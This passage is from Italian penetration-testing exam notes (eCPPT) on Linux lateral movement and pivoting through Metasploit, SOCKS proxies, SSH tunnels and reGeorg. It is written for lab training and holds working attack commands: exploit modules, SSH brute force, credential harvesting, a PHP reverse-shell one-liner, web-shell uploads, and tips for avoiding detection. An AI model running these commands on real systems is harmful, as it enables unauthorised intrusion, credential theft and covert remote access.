# 6. SSH a target3 come bron
ssh bron@192.168.69.5

# 7. Su target3: credentials.txt → danny + reuse cross-service
cat /home/danny/credentials.txt
ftp 192.168.69.5             # user danny ✓
ssh danny@192.168.69.3       # password reuse → ✓

# 8. Target4 via /var/mail
ssh bron@192.168.69.6
cat /var/mail/bron           # → password robert
su robert
```

### Punti d'attenzione esame
- **SSH è IL protocollo di LM Linux** (porta 22).
- **`~/.bash_history`** = fonte #1.
- **SSH keys**: `chmod 400` obbligatorio.
- **Firefox creds**: `key4.db` + `logins.json` → **firepwd** (Python2).
- **`/var/mail/<user>`** è ricorrente.
- **Credential reuse** cross-host & cross-service (SSH/FTP/MySQL/web).
- **SQLite** locali → `SELECT * FROM users`.
- **`su`** = LM intra-host (no log SSH).
- Niente PtH (no NTLM), niente WMI nativo: il LM Linux è quasi tutto pratico.

---



### Quiz: Linux LM: SSH, chiavi, credential hunting

<div class="ecppt-quiz" data-module="05_Lateral_Movement_Pivoting" data-block="3"></div>

## 5. Pivoting

### 5.1 Concetti generali e topologie

**Pivoting** = usare un host compromesso come **proxy/gateway** per raggiungere
reti non direttamente instradabili dall'attaccante. Il **pivot point** deve
avere routing/dual-NIC verso la rete target.

#### Topologia base (un singolo hop)

```
                      ╔═══════════════════════════╗
                      ║   RETE ESTERNA / DMZ      ║
[Kali Attacker] ──────╫──────> [VICTIM 1 / PIVOT] ║
   10.0.0.10          ║         10.0.0.50         ║
                      ╚═════════════│═════════════╝
                                    │ (2nd NIC)
                                    │ 172.16.5.50
                      ╔═════════════│═════════════╗
                      ║   RETE INTERNA            ║
                      ║         [VICTIM 2]        ║
                      ║         172.16.5.100      ║
                      ╚═══════════════════════════╝

Kali NON può raggiungere 172.16.5.0/20 direttamente.
Victim1 PUÒ raggiungere 172.16.5.100.
→ Usiamo Victim1 come pivot.
```

#### Multi-hop pivot (concetto)

```
[Kali] ─── pivot1 ─── (rete A) ─── pivot2 ─── (rete B) ─── target finale
         autoroute              autoroute / SSH -D
         + socks_proxy          + proxychains chain
```

Ogni hop richiede **ripetere lo stesso pattern** (autoroute + socks/portfwd o
ssh -D incatenato).

#### REVERSE vs BIND payload post-pivot (regola d'oro)
- **Pivot iniziale** (esposto a Internet) → **reverse payload OK** (il target
  iniziale può raggiungere Kali).
- **Target interno post-pivot** → **BIND payload obbligatorio**. Il target
  interno **non ha route inversa** verso Kali → reverse fallisce.

```
# Reverse: target → attacker (richiede egress dal target verso Kali)
windows/meter⁠preter/reverse_tcp        ✓ pivot,  ✗ post-pivot

# Bind: attacker → target (target apre porta, attacker si connette)
windows/meter⁠preter/bind_tcp           ✓ post-pivot (route MSF lo instrada)
```

---

### 5.2 Metasploit route + portfwd

**Video sorgente:** [012_Pivoting & Port Forwarding with Metasploit.md](../Lateral%20Movement%20&%20Pivoting/012_Pivoting%20&%20Port%20Forwarding%20with%20Metasploit.md)

#### I due ingredienti
1. **`run autoroute`** (o `route add`) — aggiunge un network route **DENTRO
   MSF**. Tutto il traffico MSF verso quella subnet passa dal Meterpreter.
   **Solo Metasploit-aware**: non funziona per nmap/curl/exploit Python esterni.
2. **`portfwd add`** — forward di una porta remota su una porta locale Kali OS.
   **Single-port tunnel**, esposto fuori MSF, usabile con qualsiasi tool.

#### Workflow tipico (6 step)

```
# Step 1: Compromise pivot (es. Rejetto HFS 2.3)
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <PIVOT_IP>
exploit

# Step 2: Verifica dual-homed
meterpreter > ipconfig
meterpreter > run get_local_subnets

# Step 3: autoroute (route MSF)
meterpreter > run autoroute -s 172.16.5.0/20
# oppure:
meterpreter > background
msf6 > route add 172.16.5.0/255.255.240.0 <SESSION_ID>
msf6 > route print

# Step 4: port scan via MSF (nmap NON funziona attraverso route)
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 172.16.5.100
msf6 > set PORTS 1-100
msf6 > run
# → 172.16.5.100:80 open

# Step 5: portfwd per esporre la porta a tool esterni
meterpreter > portfwd add -l 1234 -p 80 -r 172.16.5.100
# Ora: localhost:1234 ↔ 172.16.5.100:80 (via pivot)

# In altro terminale Kali:
nmap -sS -sV -p 1234 127.0.0.1
# → BadBlue 2.7

# Step 6: exploit target interno con BIND payload
msf6 > use exploit/windows/http/badblue_passthru
msf6 > set payload windows/meter⁠preter/bind_tcp     # ← CRITICO
msf6 > set RHOSTS 172.16.5.100
msf6 > set LPORT 4444
msf6 > exploit
# → Meterpreter session 2 (Victim2)
```

#### Comandi portfwd completi
```
meterpreter > portfwd add    -l <LPORT> -p <RPORT> -r <INTERNAL_IP>
meterpreter > portfwd list
meterpreter > portfwd delete -l <LPORT> -p <RPORT> -r <INTERNAL_IP>
meterpreter > portfwd flush
```

#### Punti d'attenzione esame
- **`autoroute` = MSF-only**, **`portfwd` = single port OS-wide**.
- Post-pivot: **BIND payload obbligatorio**.
- Subnet mask comuni: **/20 = 255.255.240.0**, **/24 = 255.255.255.0**.
- `portscan/tcp` via route è **lentissimo** → limita `PORTS`.
- Una sessione = un hop. Multi-hop = ripetere su una seconda sessione.

---

### 5.3 SOCKS Proxy (MSF + proxychains)

**Video sorgente:** [013_Pivoting with SOCKS Proxy.md](../Lateral%20Movement%20&%20Pivoting/013_Pivoting%20with%20SOCKS%20Proxy.md)

#### Cos'è
- **SOCKS proxy** in MSF espone un proxy sul Kali OS che tunnella **TUTTO** il
  traffico TCP attraverso la `route` MSF, **senza limite di porte**.
- Combinato con **`proxychains`** → permette qualsiasi tool (nmap, curl, Hydra,
  exploit Python, ssh, sqlmap…) verso la rete interna.
- Modulo moderno: **`auxiliary/server/socks_proxy`**.
- Legacy: `auxiliary/server/socks4a` / `auxiliary/server/socks5`.

#### Topologia

```
                                            ╔═══════════════════════╗
                                            ║   RETE INTERNA        ║
[Kali] ──proxychains──> [MSF :9050]         ║                       ║
                              │             ║                       ║
                              │ route       ║   [VICTIM 2]          ║
                              v             ║   192.168.x.3         ║
                       [Meterpreter on      ║   web :80             ║
                        VICTIM 1 (pivot)]──>║   mysql :3306         ║
                                            ╚═══════════════════════╝

Tutto il traffico:
  Kali tool → proxychains → 127.0.0.1:9050 → MSF SOCKS module
            → route MSF → Meterpreter pivot → target interno
```

#### Setup completo

```
# 1. Foothold + Meterpreter sul pivot (es. vsftpd 2.3.4 backdoor)
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 10.0.0.3
msf6 > exploit
# → command shell session 1

# 2. Upgrade a Meterpreter
msf6 > sessions -u 1

# 3. Recon + autoroute
msf6 > sessions -i 2
meterpreter > ifconfig            # eth1: 192.168.69.2/24
meterpreter > background

msf6 > use post/multi/manage/autoroute
msf6 > set SUBNET 192.168.69.0
msf6 > set SESSION 2
msf6 > run

# 4. SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 9050
msf6 > set VERSION 4a              # o 5 (allinea con proxychains.conf)
msf6 > run -j                      # job in background

# Verifica listener
$ netstat -antp | grep 9050

# 5. /etc/proxychains.conf (controlla)
$ tail /etc/proxychains.conf
# [ProxyList]
# socks4  127.0.0.1 9050

# 6. Uso da Kali (qualsiasi tool TCP)
proxychains nmap -sT -Pn -p 1-1000 192.168.69.3
proxychains curl http://192.168.69.3/
proxychains python 38730.py http://192.168.69.3/clipper admin password "id"
proxychains hydra -l root -P rockyou.txt ssh://192.168.69.3
proxychains ssh user@192.168.69.3
```

#### `/etc/proxychains.conf` (sezione finale)

```
[ProxyList]
socks4  127.0.0.1 9050
# socks5 127.0.0.1 9050     # scommenta se MSF VERSION = 5
```

#### Versioni del modulo MSF

| Modulo | Note |
|---|---|
| `auxiliary/server/socks4a` | Legacy, solo SOCKS4a |
| `auxiliary/server/socks5` | Legacy, solo SOCKS5 |
| **`auxiliary/server/socks_proxy`** | **Moderno (MSF 6.x)** — `VERSION` selezionabile |

#### Punti d'attenzione esame
- Modulo: **`auxiliary/server/socks_proxy`** (moderno).
- **Porta 9050** = default proxychains.
- **`VERSION` (4a/5)** deve coincidere in MSF e in `proxychains.conf`.
- **`proxychains` è TCP-only**: niente UDP, niente ICMP.
- **`nmap -sT -Pn`** obbligatorio via proxychains (raw SYN non passa,
  ping ICMP non passa).
- Prerequisito: **`autoroute`** attivo.
- **`run -j`** = job in background.
- Vantaggio vs `portfwd`: **tutta la subnet, tutte le porte**.
- Svantaggio: latenza, no UDP, alcuni exploit complessi possono non funzionare.

---

### 5.4 SSH Tunneling (-L / -R / -D)

**Video sorgente:** [014_Pivoting via SSH Tunneling.md](../Lateral%20Movement%20&%20Pivoting/014_Pivoting%20via%20SSH%20Tunneling.md)

#### Cos'è
- SSH tunneling = uso di SSH per creare **tunnel cifrati** che trasportano
  traffico arbitrario.
- **Equivalente OS-native** dei tool MSF: niente framework, niente payload,
  basta SSH legittimo → bassissima detection.
- Prerequisito: pivot con **SSH server attivo + credenziali** (tipicamente
  Linux; possibile su Windows con OpenSSH).

#### Tre varianti

##### Local port forwarding (`-L`)

```
ssh -L <local_port>:<target_host>:<target_port> <user>@<pivot>
```
- Apre `local_port` sul **Kali**.
- Connessioni a `127.0.0.1:<local_port>` vengono tunnellate via SSH al pivot,
  che le inoltra a `<target_host>:<target_port>` (visto dal pivot).
- **Equivalente OS-native** di `portfwd` MSF.

```bash
# Es: web di victim2 esposto su :8080 del Kali
ssh -L 8080:192.168.69.3:80 root@victim1
curl http://127.0.0.1:8080/
```

##### Remote port forwarding (`-R`)

```
ssh -R <remote_port>:<target_host>:<target_port> <user>@<attacker>
```
- Apre `remote_port` sul **server SSH dell'attaccante**.
- Connessioni lì vengono tunnellate **indietro** al client (la vittima), che
  le inoltra a `<target_host>:<target_port>` visto dalla sua prospettiva.
- Caso d'uso: la vittima ha SSH client uscente ma non possiamo connetterci a
  lei → si "chiama indietro" e ci espone un servizio interno.

```bash
# Dal pivot compromesso, esponi SSH interno di victim2 sul Kali su :2222
ssh -R 2222:192.168.69.3:22 attacker@kali_public_ip
# Sul Kali: ssh user@127.0.0.1 -p 2222 → arriva a victim2
```

##### Dynamic port forwarding (`-D`) — la stella del modulo

```
ssh -D <local_port> <user>@<pivot>
```
- Apre un **SOCKS proxy** (SOCKS4/5) su `127.0.0.1:<local_port>` del Kali.
- **Qualsiasi** connessione TCP via quel SOCKS viene incapsulata in SSH e
  instradata dal pivot al suo destino reale.
- **Equivalente OS-native** di `auxiliary/server/socks_proxy` MSF, **senza
  bisogno di Meterpreter**.

```bash
ssh -D 9050 root@victim1
# In altro terminale:
proxychains nmap -sT -Pn 192.168.69.3
proxychains curl http://192.168.69.3/
proxychains python exploit.py http://192.168.69.3/clipper admin password "id"
proxychains ssh user@192.168.69.3
```

#### Flag utili

| Flag | Significato |
|---|---|
| `-N` | No remote command (solo tunnel, niente shell) |
| `-f` | Background dopo l'auth |
| `-C` | Compressione |
| `-q` | Quiet |
| `-g` | Permetti ad host remoti di connettersi alle porte forwardate |

**Fire-and-forget:** `ssh -D 9050 -N -f root@victim1`

#### Lab walkthrough (riassunto)
1. `ifconfig` su Kali → identifica subnet (Kali = `.2`, target pubblico = `.3`).
2. Nmap su target → solo SSH aperto.
3. Brute force SSH: `hydra -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt ssh://<ip>`.
4. SSH come root → `ifconfig` rivela seconda NIC su rete interna.
5. Chiudi e riapri con `-D`: `ssh -D 9050 root@victim1`.
6. `netstat -antp | grep 9050` → listener SOCKS locale attivo.
7. `proxychains nmap -sT -Pn 192.168.69.3` → trova `:80` e `:3306`.
8. `proxychains curl http://192.168.69.3/` → identifica Clipper CMS.
9. `proxychains python 38730.py http://192.168.69.3/clipper admin password "id"` → reverse shell.

#### Multi-hop SSH

```bash
# Jump chain nativo OpenSSH
ssh -J jump1,jump2 user@final

# In alternativa, due -L incatenate o due -D su porte diverse
```

#### Punti d'attenzione esame
- **Memorizza le tre flag**: `-L` (Local), `-R` (Remote), `-D` (Dynamic/SOCKS).
- **`-D` apre un SOCKS** sul lato client SSH (attaccante).
- **Combo obbligata con proxychains**: `proxychains nmap -sT -Pn <target>`.
- `-N -f` = tunnel "puro" in background, OPSEC-friendly.
- Vantaggio vs MSF: **nessun payload**, solo SSH legittimo → bassa detection.
- Limite `-D` SOCKS: **TCP-only**. Per UDP → `sshuttle`, `chisel`.

---

### 5.5 reGeorg (HTTP tunneling via web shell)

**Video sorgente:** [015_Pivoting with reGeorg.md](../Lateral%20Movement%20&%20Pivoting/015_Pivoting%20with%20reGeorg.md)

#### Cos'è
**reGeorg** = tunneling **HTTP-based SOCKS proxy** via **web shell**. Risolve
il problema di pivotare quando:
- hai compromesso un web server,
- hai solo accesso come utente non privilegiato (es. `www-data`),
- **non puoi** fare port forwarding OS-native (richiede root/admin) né aprire
  socket arbitrari,
- il firewall in uscita permette solo HTTP/HTTPS.

Idea: carichi sul server vulnerabile uno script endpoint (`tunnel.php` /
`.aspx` / `.jsp`…). Il **client reGeorg** locale parla con quell'endpoint via
HTTP/HTTPS e ti espone un **SOCKS proxy locale**. Tutto il traffico viaggia
**dentro richieste HTTP** → bypassa firewall restrittivi.

#### Topologia

```
                                    ┌─────────────────────────┐
                                    │  Firewall: solo :80 OUT │
                                    └─────────────┬───────────┘
                                                  │
  [Kali] ──proxychains──> 127.0.0.1:9050          │
                              │                   │
                       [reGeorgSocksProxy.py]     │
                              │                   │
                              │  HTTP POST/GET ───┘
                              v
                   [VICTIM1 / web server]
                   Apache/IIS/Tomcat compromesso
                   └─ /public/tunnel.php (endpoint, gira come www-data)
                              │
                              │ socket() lato server
                              v
                   ┌─────────────────────────┐
                   │  RETE INTERNA           │
                   │  [VICTIM2] 192.168.x.3  │
                   │    :22 ssh, :80 web     │
                   └─────────────────────────┘
```

#### Endpoint disponibili (scegliere per tecnologia)

| File | Per |
|---|---|
| `tunnel.php` | PHP |
| `tunnel.aspx` / `tunnel.ashx` | ASP.NET / IIS |
| `tunnel.jsp` / `tunnel.jspx` | Java / Tomcat / JBoss |
| `tunnel.nosocket.php` | PHP dove `socket_create` è disabilitato |

L'endpoint riceve direttive HTTP (CONNECT / DISCONNECT / FORWARD / READ) dal
client e usa le primitive del linguaggio server (PHP socket, .NET Socket, ecc.)
per parlare con `target_host:port`. **Funziona dentro i privilegi del processo
web** → niente root.

#### Lab walkthrough (riassunto)
1. Nmap target → `:80` WolfCMS + `:3306` MySQL.
2. `searchsploit wolf` → exploit arbitrary file upload (`3681.php`).
3. Login admin panel `/?/admin/login` (lab creds: `Robert / password1`).
4. Upload `php-backdoor.php` da `/usr/share/webshells/php/`.
5. Reverse shell PHP in MSF `multi/handler` (payload `php/reverse_php`).
6. Shell come `www-data`. `ifconfig` mostra seconda NIC interna.
7. Carica `tunnel.php` di reGeorg via lo stesso file upload.
8. Verifica: `http://victim1/public/tunnel.php` → restituisce
   `Georg says, 'All seems fine'`.
9. Sul Kali: `python reGeorgSocksProxy.py -p 9050 -u http://victim1/public/tunnel.php`.
10. `proxychains nmap -sT -Pn 192.168.x.3` → trova SSH.
11. `proxychains hydra -l root -P rockyou-40.txt ssh://192.168.x.3`.
12. `proxychains ssh root@192.168.x.3` → accesso a victim2.

#### Comandi chiave

```bash
# Recon
nmap -sS -sV 192.168.x.3
searchsploit wolf

# Reverse shell handler
msf6 > use exploit/multi/handler
msf6 > set payload php/reverse_php
msf6 > set LHOST <kali_ip>
msf6 > set LPORT 4444
msf6 > exploit -j

# Payload da php-backdoor (campo "execute")
php -r '$sock=fsockopen("<kali_ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Upload tunnel.php via lo stesso file upload (WolfCMS admin panel)
# Test
curl http://victim1/public/tunnel.php
# → "Georg says, 'All seems fine'"

# Avvia client reGeorg
cd ~/Desktop/tools/reGeorg
python reGeorgSocksProxy.py -p 9050 -u http://victim1/public/tunnel.php

# Uso tunnel
proxychains nmap -sT -Pn 192.168.x.3
proxychains hydra -t 4 -l root \
    -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt \
    ssh://192.168.x.3
proxychains ssh root@192.168.x.3
```

#### Punti d'attenzione esame
- **Use case unico**: pivot con **solo web shell + nessun privilegio +
  firewall HTTP-only**. Se l'esame descrive questo scenario → reGeorg.
- **Endpoint coerente con la tecnologia**: PHP → `.php`, IIS → `.aspx`,
  Tomcat → `.jsp`. Caricare `.aspx` su Apache non eseguirà nulla.
- **Porta 9050** allineata con `proxychains.conf`.
- Signature di funzionamento: `Georg says, 'All seems fine'`.
- **`tunnel.nosocket.php`** per host PHP dove `socket_create` è disabilitato.
- Traffico tutto HTTP → bypassa firewall, **ma** rumoroso a livello applicativo
  (log Apache/IIS pieni di POST su `tunnel.php`).
- **Limiti**: TCP-only, latenza alta (polling HTTP), nmap aggressivo lento.
- **Alternative moderne**: **Neo-reGeorg** (fork mantenuto), **Chisel** in
  HTTP mode, **pivotnacci**. reGeorg resta il riferimento classico eCPPT.
- **OPSEC**: `tunnel.php` è file su disco → IR lo trova → in red team
  rinominare e nascondere.

---



### Quiz: SSH Tunneling e reGeorg

<div class="ecppt-quiz" data-module="05_Lateral_Movement_Pivoting" data-block="5"></div>

## 6. Tabelle decisionali

### 6.1 Quale tool di Lateral Movement Windows?

| Scenario | Tool consigliato | Perché |
|---|---|---|
| Hai password admin, target Win, vuoi RCE veloce | **`psexec.py`** | Standard, SYSTEM diretto, accetta hash |
| Hai password admin ma vuoi **bassa traccia** (no Event 7045) | **`smbexec.py`** o **`wmiexec.py`** | No service classico / no SMB share write |
| Hai un **range** di host e vuoi sprayare cred + exec | **CrackMapExec / NetExec** | Multi-host, multi-protocollo, moduli |
| Hai NT hash → vuoi **Meterpreter** integrato per pivot | **MSF `windows/smb/psexec`** | Meterpreter pronto per autoroute/socks |
| Vuoi **shell PowerShell interattiva** + script in-memory | **Evil-WinRM** | Loading script senza disk write |
| Hai clear-text + RDP attivo + target con GUI necessaria | **xfreerdp** | GUI, ma NO PtH (salvo Restricted Admin) |
| Target ha **WMI but no SMB exposed** | **`wmiexec.py`** | Usa 135 + RPC dinamica, no 445 |
| Target ha **WinRM (5985/5986)** + hash NTLM | **Evil-WinRM `-H`** | PtH-WinRM funziona |

### 6.2 PsExec vs SMBExec vs WMIExec (la triade Impacket)

| Caratteristica | PsExec | SMBExec | WMIExec |
|---|---|---|---|
| Porte | SMB 445 | SMB 445 | RPC 135 + dyn 49152-65535 |
| Servizio creato | **Sì** (temp) | **No** (semi) | **No** |
| Scrive su ADMIN$ | **Sì** | **Sì** | **No** |
| Event ID 7045 | **Sì** (loud) | Più pulito | No |
| Shell | Full cmd | Semi-interactive | Semi-interactive |
| PtH | Sì | Sì | Sì |
| Admin richiesto | Sì | Sì | Sì |
| Risultato | SYSTEM | SYSTEM | SYSTEM |
| Stealthiness | Bassa | Media | **Alta** |

### 6.3 Quale tecnica di Pivoting?

| Scenario | Tecnica | Comando-chiave |
|---|---|---|
| Hai **Meterpreter privilegiato** sul pivot, vuoi tutta la rete | **`autoroute` + `socks_proxy`** | `run autoroute -s <subnet>` + `use auxiliary/server/socks_proxy` |
| Hai Meterpreter, ti serve **UNA porta specifica** esposta a tool esterni | **`portfwd`** | `portfwd add -l 1234 -p 80 -r <ip>` |
| Hai **SSH + credenziali** sul pivot (Linux/OpenSSH) | **`ssh -D 9050`** | `ssh -D 9050 -N -f user@pivot` |
| Vuoi **UNA porta specifica** via SSH (no MSF) | **`ssh -L`** | `ssh -L 8080:<int_target>:80 user@pivot` |
| La vittima può uscire ma noi non possiamo entrare | **`ssh -R`** | `ssh -R 2222:127.0.0.1:22 user@attacker` |
| Solo **web shell**, no privilegi, no SSH, firewall solo HTTP | **reGeorg** | Upload `tunnel.<ext>` + `reGeorgSocksProxy.py -p 9050 -u <url>` |
| Exploit interno post-pivot: payload? | **BIND** payload | `set payload windows/meter⁠preter/bind_tcp` |

### 6.4 portfwd vs socks_proxy vs ssh -D vs reGeorg

| Caratteristica | `portfwd` MSF | `socks_proxy` MSF | `ssh -D` | reGeorg |
|---|---|---|---|---|
| Scope | Single port | Intera subnet | Intera subnet | Intera subnet |
| Tool esterni? | Sì (1 porta alla volta) | Sì (proxychains) | Sì (proxychains) | Sì (proxychains) |
| Richiede Meterpreter | Sì | Sì | No | No |
| Richiede privilegi pivot | Meterpreter (qualunque) | Meterpreter (qualunque) | **Cred SSH valide** | **Solo web shell** |
| Trasporto | TCP via Meterpreter | TCP via Meterpreter | TCP via SSH (cifrato) | TCP via HTTP/HTTPS |
| Detection | Media | Media | **Bassa** | Alta (log HTTP) |
| Velocità | Buona | Media | Buona | **Bassa** |
| UDP | No | No | No | No |
| Use case ideale | Singolo servizio | Tutta la rete via MSF | Tutta la rete OS-native | Web shell senza priv |

### 6.5 Albero decisionale rapido (per l'esame)

```
Hai Meterpreter privilegiato sul pivot?
├── Sì → ti serve UNA porta?
│         ├── Sì → portfwd add
│         └── No → autoroute + socks_proxy + proxychains
└── No → Hai SSH + creds sul pivot?
         ├── Sì → ssh -D 9050 + proxychains   (oppure -L per single port)
         └── No → Hai una web shell non privilegiata?
                  ├── Sì → reGeorg (tunnel.<ext> + reGeorgSocksProxy.py)
                  └── No → torna a fare lateral movement
```

---

## 7. Cheat sheet impacket consolidato

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Impacket Suite & Lateral Movement](../10_Cheatsheet.md#impacket-suite-lateral-movement).

---

## 8. Cheat sheet proxychains / SOCKS

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Pivoting — proxychains, SOCKS, SSH, reGeorg](../10_Cheatsheet.md#pivoting).

---

## 9. Punti d'attenzione per l'esame eCPPT

### Concettuali (domande a risposta multipla "secche")

- **Lateral Movement vs Pivoting**: stessa rete vs **attraverso** un host
  verso un'altra rete. Domanda ricorrente.
- **Porte**:
  - SMB: 445 (139 NetBIOS legacy)
  - RDP: 3389
  - WinRM: 5985 HTTP / 5986 HTTPS
  - WMI: 135 RPC + dinamica 49152-65535
  - SSH: 22
- **Pass-the-Hash** funziona su **NTLM** (SMB, WinRM, WMI), **NON su RDP**
  standard (salvo Restricted Admin Mode).
- **PsExec richiede local Administrators** (errore `RPC_ACCESS_DENIED` se
  manca).
- **Formato hash Impacket**: `LM:NT` (32 zeri se solo NT).
- **MSF SMBPass**: identica regola.
- **CME `-x` (CMD) vs `-X` (PowerShell)**.
- **`Pwn3d!`** = local admin (CME).
- **Modulo MSF PtH**: `exploit/windows/smb/psexec`.
- **Modulo MSF SOCKS moderno**: `auxiliary/server/socks_proxy`.

### Pratiche (riconoscere lo scenario)

- **Hash NTLM in mano, vuoi RCE**: psexec.py o MSF psexec → SYSTEM.
- **Hash NTLM, vuoi PowerShell interattivo**: Evil-WinRM `-H`.
- **Vuoi essere silenzioso post-PtH**: WMIExec (no service, no ADMIN$).
- **Hai un `.rdg` file**: estrai con SharpDPAPI + master key da Mimi⁠katz
  `sekur⁠lsa::dpapi`.
- **Solo SSH + creds sul pivot**: `ssh -D 9050` + proxychains.
- **Web shell come www-data + firewall HTTP-only**: reGeorg.
- **Post-pivot, exploit interno**: **BIND payload** (reverse non funziona).
- **proxychains + nmap**: sempre **`-sT -Pn`**.

### OPSEC

- PsExec/SMBExec creano servizi e file su ADMIN$ → loggati.
- WMIExec è la più stealthy della triade Impacket.
- WinRM ha `WSMan` log specifici.
- Evil-WinRM `-s` carica script **in memoria** → niente disk artifact.
- reGeorg lascia il file `tunnel.<ext>` sul web server (IR lo trova facilmente).
- SSH tunneling è il più legittimo: traffico cifrato dentro un protocollo
  ammesso → bassa detection.

### Non coperto nel modulo (riferimenti)

- **VPN pivoting** (SoftEther, sshuttle, Chisel) — Alexis lo dichiara
  esplicitamente come futuro update.
- **Pass-the-Ticket / Overpass-the-Hash / Golden / Silver Tickets** → modulo
  **Active Directory Penetration Testing**.
- **Detection avanzata** (Sysmon, Splunk queries) → defensive course.

---

## 10. Mappa video → file sorgente

| # | Titolo video | File `.md` |
|---|---|---|
| 01 | Course Introduction | [01_Course Introduction.md](../Lateral%20Movement%20&%20Pivoting/01_Course%20Introduction.md) |
| 02 | Introduction to Lateral Movement & Pivoting | [02_Introduction to Lateral Movement & Pivoting.md](../Lateral%20Movement%20&%20Pivoting/02_Introduction%20to%20Lateral%20Movement%20&%20Pivoting.md) |
| 03 | Windows Lateral Movement Techniques | [03_Windows Lateral Movement Techniques.md](../Lateral%20Movement%20&%20Pivoting/03_Windows%20Lateral%20Movement%20Techniques.md) |
| 04 | Lateral Movement with PsExec | [04_Lateral Movement with PsExec.md](../Lateral%20Movement%20&%20Pivoting/04_Lateral%20Movement%20with%20PsExec.md) |
| 05 | Lateral Movement with SMBExec | [05_Lateral Movement with SMBExec.md](../Lateral%20Movement%20&%20Pivoting/05_Lateral%20Movement%20with%20SMBExec.md) |
| 06 | Lateral Movement with CrackMapExec | [06_Lateral Movement with CrackMapExec.md](../Lateral%20Movement%20&%20Pivoting/06_Lateral%20Movement%20with%20CrackMapExec.md) |
| 07 | Lateral Movement via RDP | [07_Lateral Movement via RDP.md](../Lateral%20Movement%20&%20Pivoting/07_Lateral%20Movement%20via%20RDP.md) |
| 08 | Lateral Movement via WinRM | [08_Lateral Movement via WinRM.md](../Lateral%20Movement%20&%20Pivoting/08_Lateral%20Movement%20via%20WinRM.md) |
| 09 | Pass-the-Hash with Metasploit | [09_Pass-the-Hash with Metasploit.md](../Lateral%20Movement%20&%20Pivoting/09_Pass-the-Hash%20with%20Metasploit.md) |
| 10 | Pass-the-Hash with WMIExec | [010_Pass-the-Hash with WMIExec.md](../Lateral%20Movement%20&%20Pivoting/010_Pass-the-Hash%20with%20WMIExec.md) |
| 11 | Linux Lateral Movement Techniques | [011_Linux Lateral Movement Techniques.md](../Lateral%20Movement%20&%20Pivoting/011_Linux%20Lateral%20Movement%20Techniques.md) |
| 12 | Pivoting & Port Forwarding with Metasploit | [012_Pivoting & Port Forwarding with Metasploit.md](../Lateral%20Movement%20&%20Pivoting/012_Pivoting%20&%20Port%20Forwarding%20with%20Metasploit.md) |
| 13 | Pivoting with SOCKS Proxy | [013_Pivoting with SOCKS Proxy.md](../Lateral%20Movement%20&%20Pivoting/013_Pivoting%20with%20SOCKS%20Proxy.md) |
| 14 | Pivoting via SSH Tunneling | [014_Pivoting via SSH Tunneling.md](../Lateral%20Movement%20&%20Pivoting/014_Pivoting%20via%20SSH%20Tunneling.md) |
| 15 | Pivoting with reGeorg | [015_Pivoting with reGeorg.md](../Lateral%20Movement%20&%20Pivoting/015_Pivoting%20with%20reGeorg.md) |
| 16 | Course Conclusion | [016_Course Conclusion.md](../Lateral%20Movement%20&%20Pivoting/016_Course%20Conclusion.md) |

---

### Quick-recall finale (1-pager mentale)

```
LM = stesso /24    PIV = subnet diversa
SMB 445  RDP 3389  WinRM 5985/5986  WMI 135+dyn  SSH 22

PtH formato: LM:NT  (zero32:NT se solo NT)
PtH SI:  SMB, WinRM, WMI       PtH NO: RDP standard

Triade Impacket (loud → stealth):
  psexec.py > smbexec.py > wmiexec.py

Pivot decision tree:
  Meterpreter? → autoroute + socks_proxy (o portfwd per single port)
  SSH+creds?   → ssh -D 9050 -N -f
  Web shell?   → reGeorg tunnel.<ext>
  Post-pivot:  → BIND payload (windows/meter⁠preter/bind_tcp)

proxychains:
  porta 9050, TCP-only, nmap -sT -Pn, no UDP, no ICMP
```
